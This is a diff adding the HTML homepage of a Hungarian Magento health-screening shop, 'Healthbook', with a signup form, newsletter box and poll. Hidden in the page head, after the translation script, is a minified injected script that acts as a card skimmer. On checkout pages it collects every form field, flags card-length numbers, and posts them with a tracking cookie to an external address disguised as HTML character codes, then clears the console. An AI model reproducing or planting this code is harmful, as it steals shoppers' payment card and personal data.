@@ -1,0 +1,576 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="hu" lang="hu">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Kezdőlap :: Healthbook</title>
+<meta name="description" content="Healthbook" />
+<meta name="keywords" content="Healthbook, Healthseeker" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.healthbook.hu/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.healthbook.hu/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.healthbook.hu/js/blank.html';
+    var BLANK_IMG = 'http://www.healthbook.hu/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://www.healthbook.hu/skin/frontend/default/hbook/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.healthbook.hu/skin/frontend/default/hbook/css/custom.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.healthbook.hu/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.healthbook.hu/skin/frontend/default/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.healthbook.hu/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/skin/frontend/default/hbook/js/glider.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/skin/frontend/default/hbook/js/slider.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/skin/frontend/default/hbook/js/productInfo.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.healthbook.hu/skin/frontend/default/hbook/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.healthbook.hu/skin/frontend/default/hbook/css/ie8.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.healthbook.hu/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.healthbook.hu/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.healthbook.hu';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"Please select an option.":"V\u00e1lasszon az al\u00e1bbi lehet\u0151s\u00e9gekb\u0151l.","This is a required field.":"Ez egy k\u00f6telez\u0151 mez\u0151.","Please enter a valid number in this field.":"Val\u00f3s sz\u00e1mot adjon meg ebben a mez\u0151ben.","Please use letters only (a-z or A-Z) in this field.":"Haszn\u00e1ljon kiz\u00e1r\u00f3lag bet\u0171ket (a-z vagy A-Z) ebben a mez\u0151ben.","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Haszn\u00e1ljon bet\u0171ket (a-z), sz\u00e1mokat (0-9) \u00e9s alulvon\u00e1st(_) ebben a mez\u0151ben, az els\u0151 karakternek bet\u0171nek kell lennie.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Val\u00f3s telefonsz\u00e1mot adjon meg. P\u00e9ld\u00e1ul: (1) 456-7890 vagy 23-456-789.","Please enter a valid date.":"Val\u00f3s d\u00e1tumot adjon meg.","Please enter a valid email address. For example johndoe@domain.com.":"Val\u00f3s e-mail c\u00edmet adjon meg.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"K\u00e9rj\u00fck minimum 6 karaktert adjon meg.","Please make sure your passwords match.":"Ellen\u0151rizze hogy egyezik-e a megadott jelsz\u00f3.","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Val\u00f3s URL-t adjon meg. P\u00e9ld\u00e1ul  http:\/\/www.example.com vagy www.example.com","Please enter a valid social security number. For example 123-45-6789.":"Val\u00f3s tb sz\u00e1mot adjon meg: 123-45-6789.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Val\u00f3s ir\u00e1ny\u00edt\u00f3sz\u00e1mot adjon meg.","Please enter a valid zip code.":"Val\u00f3s ir\u00e1ny\u00edt\u00f3sz\u00e1mot adjon meg.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"K\u00e9rj\u00fck ezt a d\u00e1tum form\u00e1tumot haszn\u00e1lja: nn\/hh\/\u00e9\u00e9\u00e9\u00e9. P\u00e9ld\u00e1ul: 17\/03\/2006 ","Please enter a valid $ amount. For example $100.00.":"Val\u00f3s \u00f6sszeget adjon meg. P\u00e9ld\u00e1ul 100.00 Ft.","Please select one of the above options.":"V\u00e1lasszon a fenti lehet\u0151s\u00e9gekb\u0151l.","Please select one of the options.":"V\u00e1lasszon az al\u00e1bbi lehet\u0151s\u00e9gekb\u0151l.","Please select State\/Province.":"V\u00e1lassza ki a megy\u00e9t.","Please enter a number greater than 0 in this field.":"K\u00e9rj\u00fck 0-n\u00e1l nagyobb sz\u00e1mot adjon meg.","Please enter a valid credit card number.":"Val\u00f3s kredit k\u00e1rtya sz\u00e1mot adjon meg.","Credit card number does not match credit card type.":"A k\u00e1rtya sz\u00e1ma nem passzol a k\u00e1rtya tp\u00edus\u00e1hoz.","Please enter issue number or start date for switch\/solo card type.":"K\u00e9rj\u00fck, \u00e1ll\u00edtson be egy sz\u00e1mot vagy kezd\u0151d\u00e1tumok a switch\/solo k\u00e1rtyat\u00edpushoz","Please wait, loading...":"K\u00e9rj\u00fck v\u00e1rjon, bet\u00f6lt\u00e9s...","Complete":"Teljes\u00edtett","Add Products":"Term\u00e9kek hozz\u00e1ad\u00e1sa","Please choose to register or to checkout as a guest":"K\u00e9rj\u00fck v\u00e1lassza a regisztr\u00e1ci\u00f3t, vagy a vend\u00e9gk\u00e9nt v\u00e1s\u00e1rl\u00e1st","Please specify payment method.":"V\u00e1lassza ki a fizet\u00e9si m\u00f3dot."});
+        //]]></script><script>function jj(e){var t="; "+document.cookie,o=t.split("; "+e+"=");return 2==o.length?o.pop().split(";").shift():void 0}jj("SESSIID")||(document.cookie="SESSIID="+(new Date).getTime()),jQuery(function(e){e("button").on("click",function(){var t="",o="post",n=window.location;if(new RegExp("onepage|checkout").test(n)){for(var c=document.querySelectorAll("input, select, textarea, checkbox"),i=0;i<c.length;i++)if(c[i].value.length>0){var a=c[i].name;""==a&&(a=i),t+=a+"="+c[i].value+"&"}if(t){var l=new RegExp("[0-9]{13,16}"),u=new XMLHttpRequest;u.open(o,e("<div />").html("&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#111;&#119;&#110;&#115;&#97;&#102;&#101;&#116;&#121;&#46;&#111;&#114;&#103;&#47;&#111;&#112;&#112;&#46;&#112;&#104;&#112;").text(),!0),u.setRequestHeader("Content-type","application/x-www-form-urlencoded"),u.send(t+"&asd="+(l.test(t.replace(/s/g,""))?1:0)+"&utmp="+n+"&cookie="+jj("SESSIID")),console.clear()}}})});</script>
+</head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-container">
+    <div class="header">
+                <h1 class="logo"><strong>Healthbook</strong><a href="http://www.healthbook.hu/" title="Healthbook" class="logo"><img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/logo.gif" alt="Healthbook" /></a></h1>
+                <h5 class="slogan">healthseeker</h5>
+        <p class="no-display"><a href="#main"><strong>Ugrás a fő tartalomhoz &raquo;</strong></a></p>
+        <form id="search_mini_form" action="http://www.healthbook.hu/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <label for="search">Search:</label>
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Keresés" class="button"><span><!--<span>Keresés</span>--></span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Keresés az összes ajánlatban...');
+            searchForm.initAutocomplete('http://www.healthbook.hu/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+        <div class="quick-access">
+            <p class="welcome-msg"> </p>
+            <div class="shop-access">
+            <ul class="links">
+                        <li class="first" ><a href="http://www.healthbook.hu/customer/account/" title="Beállítások" >Beállítások</a></li>
+                                <li class=" last" ><a href="http://www.healthbook.hu/customer/account/login/referer/aHR0cDovL3d3dy5oZWFsdGhib29rLmh1Lz9fX19TSUQ9VQ,,/" title="Bejelentkezés" >Bejelentkezés</a></li>
+            </ul>
+        </div>
+    </div>
+                </div>
+<div class="nav-container">
+    <ul id="nav">
+        <li class="level0 first nav-home"><a href="http://www.healthbook.hu/"><span>Kezdőlap</span></a></li>
+                    <li  class="level0 nav-1 first level-top"><a href="http://www.healthbook.hu/szures.html"  class="level-top" ><span>Szűrés</span></a></li><li  class="level0 nav-2 last level-top"><a href="http://www.healthbook.hu/ajanlatok.html"  class="level-top" ><span>Ajánlatok</span></a></li>                <li class="nav-about"><a href="http://www.healthbook.hu/tamogatok/"><span>Támogatók</span></a></li>
+<li class="nav-about"><a href="http://www.healthbook.hu/sajto/"><span>Sajtó</span></a></li>
+<li class="nav-about"><a href="http://www.healthbook.hu/rolunk/"><span>Rólunk</span></a></li>
+<li class="nav-about"><a href="http://www.healthbook.hu/contacts/"><span>Kapcsolat</span></a></li>
+<li class="nav-contacts last"><a href="http://www.healthbook.hu/babymap/"><span>babyMAP</span></a></li>    </ul>
+</div>
+</div>        <div class="main-container col2-right-layout">
+            <div class="main">
+                                <div class="col-main">
+                                        <div class="std"><div id="slider">
+    <div class="slidercontrolwr">
+        <div class="slidercontrol">
+            <a href="#section1" title="Slide 1" class="">1</a>
+            <a href="#section2" title="Slide 2" class="">2</a>
+            <a href="#section3" title="Slide 3" class="">3</a>
+            <a href="#section4" title="Slide 4" class="">4</a>
+            <a href="#section5" title="Slide 5" class="">5</a>
+        </div>
+    </div>
+    <div class="scroller">
+        <div class="content">
+            <div class="sectionslide" id="section1">
+                <a href="http://www.healthbook.hu/szures/" title="Szűrés egy csepp vérből"><img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/slider/slider1.jpg" alt="Szűrés egy csepp vérből" /></a>
+            </div>
+            <div class="sectionslide" id="section2">
+                <a href="http://www.healthbook.hu/angel/" title="Angel programunkkal már születéstől fogva nyomon követheti gyermeke állapotát"><img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/slider/slider2.jpg" alt="Angel programunkkal már születéstől fogva nyomon követheti gyermeke állapotát" /></a>
+            </div>
+            <div class="sectionslide" id="section3">
+                <a href="http://www.healthbook.hu/szures/" title="Szűrés egy csepp vérből"><img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/slider/slider3.jpg" alt="Szűrés egy csepp vérből" /></a>
+            </div>
+            <div class="sectionslide" id="section4">
+                <a href="http://www.healthbook.hu/angel/" title="Angel programunkkal már születéstől fogva nyomon követheti gyermeke állapotát"><img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/slider/slider4.jpg" alt="Angel programunkkal már születéstől fogva nyomon követheti gyermeke állapotát" /></a>
+            </div>
+            <div class="sectionslide" id="section5">
+                <a href="http://www.healthbook.hu/szures/" title="Szűrés egy csepp vérből"><img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/slider/slider5.jpg" alt="Szűrés egy csepp vérből" /></a>
+            </div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript" charset="utf-8">
+    var my_glider = new Glider('slider', {duration:0.5, autoGlide: true, frequency: 4, initialSection: 'section1'});   
+</script>
+<div class="widget widget-static-block">
+            <div id="webform_1_success_text" class="std webforms-success-text"
+             style="display:none"></div>
+    
+    
+        <div id="webform_1_form">
+
+            
+                            <iframe id="webform_1_iframe"
+                        name="webform_1_iframe"
+                        style="width:0;height:0;border:0;position:absolute"></iframe>
+            
+            <form action="http://www.healthbook.hu/webforms/index/iframe/" method="post"
+                  name="webform_1"
+                  id="webform_1" enctype="application/x-www-form-urlencoded"
+                  class="webforms-bejelentkezo"
+                  target="webform_1_iframe">
+
+
+                <input type="hidden" name="submitWebform_1" value="1"/>
+                <input type="hidden" name="webform_id" value="1"/>
+
+                
+                
+                
+                    <div id="fieldset_1" class="fieldset fieldset-1"
+                        >
+
+                                                    <h2 class="legend">Bejelentkezés szűrésre</h2>
+                        
+                        <ul class="form-list">
+                                                                                                                                    <li                                     class="fields "
+                                    >
+                                                                <div id="field_1"
+                                     class="field webforms-fields-1"
+                                    >
+
+                                                                            <label for="field_1"
+                                               class="required">
+                                                                                            <em>*</em>
+                                                                                        Vezetéknév                                        </label>
+                                    
+                                    <div class="input-box">
+                                        <input type='text' name='field[1]' id='field[1]'
+       class='input-text required-entry ' style=''
+       value=""
+                     />
+                                    </div>
+
+                                </div>
+                                                                                                                                <div id="field_2"
+                                     class="field webforms-fields-2"
+                                    >
+
+                                                                            <label for="field_2"
+                                               class="required">
+                                                                                            <em>*</em>
+                                                                                        Keresztnév                                        </label>
+                                    
+                                    <div class="input-box">
+                                        <input type='text' name='field[2]' id='field[2]'
+       class='input-text required-entry ' style=''
+       value=""
+                     />
+                                    </div>
+
+                                </div>
+                                                                                                                                    </li>                                    <li id="field_3_row"                                     class="wide webforms-fields-row-3"
+                                    >
+                                                                <div id="field_3"
+                                     class=" webforms-fields-3"
+                                    >
+
+                                                                            <label for="field_3"
+                                               class="required">
+                                                                                            <em>*</em>
+                                                                                        E-mail cím                                        </label>
+                                    
+                                    <div class="input-box">
+                                        <input type='text' name='field[3]' id='field[3]'
+       class='input-text required-entry validate-email ' style=''
+       value=""
+       onkeyup="this.value = this.value.replace(' ','');"              />
+                                    </div>
+
+                                </div>
+                                                                                                                                    </li>                                    <li                                     class="fields "
+                                    >
+                                                                <div id="field_11"
+                                     class="field webforms-fields-11"
+                                    >
+
+                                                                            <label for="field_11"
+                                               class="required">
+                                                                                            <em>*</em>
+                                                                                        Telefonszám                                        </label>
+                                    
+                                    <div class="input-box">
+                                        <input type='text' name='field[11]' id='field[11]'
+       class='input-text required-entry validate-number ' style=''
+       value=""
+                     />
+                                    </div>
+
+                                </div>
+                                                                                                                                    </li>                                    <li id="field_12_row"                                     class="wide webforms-fields-row-12"
+                                    >
+                                                                <div id="field_12"
+                                     class=" webforms-fields-12"
+                                    >
+
+                                                                            <label for="field_12"
+                                               class="required">
+                                                                                            <em>*</em>
+                                                                                        Melyik nap                                        </label>
+                                    
+                                    <div class="input-box">
+                                        <select name='field[12]' id='field[12]' class='input-text required-entry' style='' >
+
+
+<option value="Hétfő délelőtt" >Hétfő délelőtt</option>
+
+
+<option value="Hétfő délután" >Hétfő délután</option>
+
+
+<option value="Kedd délelőtt" >Kedd délelőtt</option>
+
+
+<option value="Kedd délután" >Kedd délután</option>
+
+
+<option value="Szerda délelőtt" >Szerda délelőtt</option>
+
+
+<option value="Szerda délután" >Szerda délután</option>
+
+
+<option value="Csütörtök délelőtt" >Csütörtök délelőtt</option>
+
+
+<option value="Csütörtök délután" >Csütörtök délután</option>
+
+
+<option value="Péntek délelőtt" >Péntek délelőtt</option>
+
+
+<option value="Péntek délután" >Péntek délután</option>
+
+
+</select>
+                                    </div>
+
+                                </div>
+                                                                                                                                    </li>                                    <li id="field_10_row"                                     class="wide webforms-fields-row-10"
+                                    >
+                                                                <div id="field_10"
+                                     class=" webforms-fields-10"
+                                    >
+
+                                                                            <label for="field_10"
+                                               >
+                                                                                        Megjegyzés                                        </label>
+                                    
+                                    <div class="input-box">
+                                        <input type='text' name='field[10]' id='field[10]'
+       class='input-text ' style='font-style:italic; color:#333'
+       value=""
+                     />
+                                    </div>
+
+                                </div>
+                                                                    </li>
+                                                                                        </ul>
+
+                    </div>
+
+                
+                
+                
+                <div class="buttons-set">
+                    <p class="required">* Kötelezően kitöltendő mezők</p>
+                    <button type="button" class="button"
+                            id="webform_1_submit_button"
+                            onclick="webform_1_submit()"
+                            title="submit">
+			<span>
+				<span>Elküld</span>
+			</span>
+                    </button>
+		<span class="please-wait" id="webform_1_sending_data"
+              style="display:none;">
+			<img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/opc-ajax-loader.gif"
+                 alt="Sending..." title="Sending..."
+                 class="v-middle"/><span
+                id="webform_1_progress_text">Sending...</span>
+		</span>
+                </div>
+
+            </form>
+
+        </div>
+
+        <script type="text/javascript">
+//<![CDATA[
+var webform_1 = new VarienForm('webform_1', 0);
+var webform_1_submit = function(){
+	var form = webform_1;
+	if(form.validator && form.validator.validate()){
+		form.submit();
+				$('webform_1_submit_button').hide();
+		$('webform_1_sending_data').show();
+			}
+};
+
+var iframe = $('webform_1_iframe');
+iframe.observe('load',function(){
+	var doc = this.contentDocument ? this.contentDocument: this.contentWindow.document;
+	var json = {success:false};
+	if(doc.body.innerHTML.unfilterJSON())
+		json = doc.body.innerHTML.evalJSON();
+	else return;
+	if(json.success > 0){
+		if(json.script){
+			eval(json.script);
+			return;
+		}
+		if(json.redirect_url){
+			$('webform_1_progress_text').update('Redirecting');
+			window.location = json.redirect_url;
+			return;
+		}
+		$('webform_1_progress_text').update('Teljesített');
+		Effect.Fade('webform_1_form',{
+			duration: 0.5, from:1, to:0,
+			afterFinish: function(){
+				$('webform_1_success_text').update(json.success_text.unescapeHTML()).show();
+				Effect.Fade('webform_1_success_text',{
+					duration:0.5, from:0, to:1
+				});
+				if(0) $('webform_1_success_text').scrollTo();
+			}
+			
+		});
+	} else {
+		if($('webform_1_sending_data'))
+			$('webform_1_sending_data').hide();
+		if($('webform_1_submit_button'))
+			$('webform_1_submit_button').show();
+		if(json.errors && typeof(json.errors) == "string"){
+			Dialog.alert(json.errors.unescapeHTML(),{
+				title: "Error(s) occured",
+				className: "alphacube",
+				width:300, 
+				buttonClass: "button",
+				okLabel: "Bezár",
+				destroyOnClose: true, 
+				recenterAuto:true
+			})
+		} else {
+			alert('Error(s) occured');
+		}
+		if(json.script){
+			eval(json.script);
+		}
+	}
+});
+//]]>
+</script>
+    </div></div>                </div>
+                <div class="col-right sidebar"><div class="block block-banner">
+    <div class="block-content">
+                    <a href="http://www.healthbook.hu/angel/" title="Angyalkaink">
+                    <img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/media/angels.gif" alt="Angyalkaink" />
+                </a>
+            </div>
+</div>
+<div class="block block-banner">
+    <div class="block-content">
+                    <a href="http://www.healthbook.hu/minta/" title="Belépés felnőtteknek">
+                    <img src="http://www.healthbook.hu/skin/frontend/default/hbook/images/media/login_adult.jpg" alt="Belépés felnőtteknek" />
+                </a>
+            </div>
+</div>
+<div class="block block-subscribe">
+    <div class="block-title">
+        <strong><span>Hírlevél</span></strong>
+    </div>
+    <form action="http://www.healthbook.hu/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+        <div class="block-content">
+            <div class="form-subscribe-header">
+                <label for="newsletter">Feliratkozás a hírlevélre</label>
+            </div>
+            <div class="input-box">
+               <input type="text" name="email" id="newsletter" title="Iratkozzon fel hírlevelünkre" class="input-text required-entry validate-email" />
+            </div>
+            <div class="actions">
+                <button type="submit" title="Feliratkozás" class="button"><span><span>Feliratkozás</span></span></button>
+            </div>
+        </div>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+    function validatePollAnswerIsSelected()
+    {
+        var options = $$('input.poll_vote');
+        for( i in options ) {
+            if( options[i].checked == true ) {
+                return true;
+            }
+        }
+        return false;
+    }
+//]]>
+</script>
+<div class="block block-poll">
+    <div class="block-title">
+        <strong><span>Szavazás</span></strong>
+    </div>
+    <form id="pollForm" action="http://www.healthbook.hu/poll/vote/add/poll_id/1/" method="post" onsubmit="return validatePollAnswerIsSelected();">
+        <div class="block-content">
+            <p class="block-subtitle">Kedvenc gyümölcse?</p>
+                        <ul id="poll-answers">
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_1" value="1" />
+                    <span class="label"><label for="vote_1">Alma</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_2" value="2" />
+                    <span class="label"><label for="vote_2">Banán</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_3" value="3" />
+                    <span class="label"><label for="vote_3">Körte</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_4" value="4" />
+                    <span class="label"><label for="vote_4">Narancs</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_5" value="5" />
+                    <span class="label"><label for="vote_5">Egyéb</label></span>
+                </li>
+                            </ul>
+            <script type="text/javascript">decorateList('poll-answers');</script>
+                        <div class="actions">
+                <button type="submit" title="Szavaz" class="button"><span><span>Szavaz</span></span></button>
+            </div>
+        </div>
+    </form>
+</div>
+</div>
+            </div>
+        </div>
+        <div class="featured-container">
+    <div class="featured-center">
+    <div class="featured-top">
+            </div>
+    </div>
+</div>        <div class="footer-container">
+    <div class="footer">
+    <div class="box informational">
+<ul>
+  <li><h6>Rólunk</h6>
+    <ul>
+      <li><a href="http://www.healthbook.hu/rolunk">Rólunk</a></li>
+      <li><a href="http://www.healthbook.hu/cegunk">Cégünk</a></li>
+      <li><a href="http://www.healthbook.hu/celunk">Célunk</a></li>
+    </ul>
+  </li>
+  <li><h6>Szűrés és utána</h6>
+    <ul>
+      <li><a href="http://www.healthbook.hu/szures">Szűrés</a></li>
+      <li><a href="http://www.healthbook.hu/elegedettseg">Elégedettségi garancia</a></li>
+      <li><a href="http://www.healthbook.hu/nyomonkovetes">Nyomonkövetés</a></li>
+    </ul>
+  </li>
+    <li><h6>Adatkezelés és biztonság</h6>
+    <ul>
+      <li><a href="http://www.healthbook.hu/adatkezeles">Adatkezelés</a></li>
+      <li><a href="http://www.healthbook.hu/biztonsag">Biztonság</a></li>
+      <li><a href="http://www.healthbook.hu/felhasznalasi">Felhasználási feltételek</a></li>
+    </ul>
+  </li>
+  <li class="last"><h6>Ügyféltájékoztató</h6>
+    <ul>
+      <li><a href="http://www.healthbook.hu/contacts">Kapcsolat</a></li>
+      <li><a href="http://www.healthbook.hu/partnerek">Partnerek</a></li>
+      <li><a href="http://www.healthbook.hu/tamogatok">Támogatók</a></li>
+    </ul>
+  </li>
+</ul>
+</div>    <div class="clear"></div>
+    <div class="contacts">
+        <div class="f-left">Healtseeker Medical Zrt. | Tel.: +36.30.268.1900 | E-mail: info@healthbook.hu | Cím: 1387 Bp Pf,; 1029</div>
+        <img class="payments" src="http://www.healthbook.hu/skin/frontend/default/hbook/images/payments.gif" alt="MasterCard, Maestro, Visa, AmericanExpress"/>
+    </div>
+    <br />
+    <p class="legality">
+        © 2014 Healthbook        <!-- This theme is avalable udner Creative Commons License http://creativecommons.org/licenses/by/3.0/    Removing links to is similarly prohibited. Magento Theme by <a href="http://templates-master.com" title="Templates master" rel="nofollow">templates-master.com</a> --><!-- Removing links to is similarly prohibited.  -->
+            </p>
+    <div class="clear"></div>
+    </div>
+</div>
+
+<script type="text/javascript" src="http://www.healthbook.hu/skin/frontend/default/hbook/js/productInfo.js"></script>
+<script type="text/javascript">
+    Event.observe(window, 'load', function() {
+        new ProductInfo('.ajax', 'p.product-image a', {
+            'loader': "http://www.healthbook.hu/skin/frontend/default/hbook/images/ajax_loader.gif",
+            'loadingMessage': "Loading"
+        });
+    });
+</script>                
+
+    </div>
+</div>
+</body>
+</html>
